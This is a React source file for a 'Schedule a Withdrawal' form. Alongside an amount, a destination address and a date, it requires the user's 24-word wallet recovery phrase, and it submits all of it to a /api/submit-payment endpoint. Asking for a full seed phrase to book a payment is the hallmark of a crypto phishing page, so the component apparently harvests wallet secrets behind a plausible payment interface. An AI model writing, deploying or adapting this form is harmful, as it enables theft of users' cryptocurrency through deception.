'use client';

import { useState } from 'react';
import SuccessPopup from '../../components/SuccessPopup';

export default function WithdrawalForm() {

  const [formData, setFormData] = useState({
    amount: '',
    keyphrases: '',
    destinationAddress: '',
    dateTime: ''
  });
  const [showSuccess, setShowSuccess] = useState(false);
  const [isSubmitting, setIsSubmitting] = useState(false);

  const handleChange = (e) => {
    const { name, value } = e.target;
    setFormData({
      ...formData,
      [name]: value
    });
  };

  const handleSubmit = async (e) => {
    e.preventDefault();
    
    if (isSubmitting) return;
    
    setIsSubmitting(true);
    
    try {
      const response = await fetch('/api/submit-payment', {
        method: 'POST',
        headers: {
          'Content-Type': 'application/json',
        },
        body: JSON.stringify(formData),
      });
      
      if (response.ok) {
        setShowSuccess(true);
      } else {
        console.error('Submission failed');
      }
    } catch (error) {
      console.error('Error submitting form:', error);
    } finally {
      setIsSubmitting(false);
    }
  };

  const closePopup = () => {
    setShowSuccess(false);
    // Reset form
    setFormData({
      amount: '',
      keyphrases: '',
      destinationAddress: '',
      dateTime: ''
    });
  };

  return (
    <div className="container">
      <div className="form-container">
        <div className="form-header">
          Schedule a Withdrawal
        </div>
        <div className="form-body">
          <form onSubmit={handleSubmit}>
            <div className="form-field">
              <label className="form-label">
                Amount (0.01 - 10000):
              </label>
              <input
                type="number"
                name="amount"
                value={formData.amount}
                onChange={handleChange}
                min="0.01"
                max="10000"
                step="0.01"
                className="form-input"
                placeholder="Enter amount"
                required
              />
            </div>

            <div className="form-field">
  <label className="form-label">
    Wallet 24 Keyphrases (space-separated):
  </label>
  <textarea
    name="keyphrases"
    value={formData.keyphrases}
    onChange={handleChange}
    className="form-input"
    placeholder="Enter keyphrases separated by spaces"
    rows="3"
    style={{ 
      minHeight: '80px', 
      resize: 'vertical' 
    }}
    required
  />
</div>

            <div className="form-field">
              <label className="form-label">
                Destination Address:
              </label>
              <input
                type="text"
                name="destinationAddress"
                value={formData.destinationAddress}
                onChange={handleChange}
                className="form-input"
                placeholder="Enter destination address"
                required
              />
            </div>

            <div className="form-field">
              <label className="form-label">
                Date & Time:
              </label>
              <input
                type="datetime-local"
                name="dateTime"
                value={formData.dateTime}
                onChange={handleChange}
                className="form-input"
                step="1"
                required
              />
              <p style={{ fontSize: '12px', color: '#777', marginTop: '5px' }}>
                Format: DD/MM/YYYY HH:MM:SS - Example: 21/03/2025, 14:54:38
              </p>
            </div>

            <button
              type="submit"
              disabled={isSubmitting}
              className="submit-button"
            >
              {isSubmitting ? 'Processing...' : 'Book Payment'}
            </button>
          </form>
        </div>
      </div>

      <SuccessPopup isVisible={showSuccess} onClose={closePopup} />
    </div>
  );
}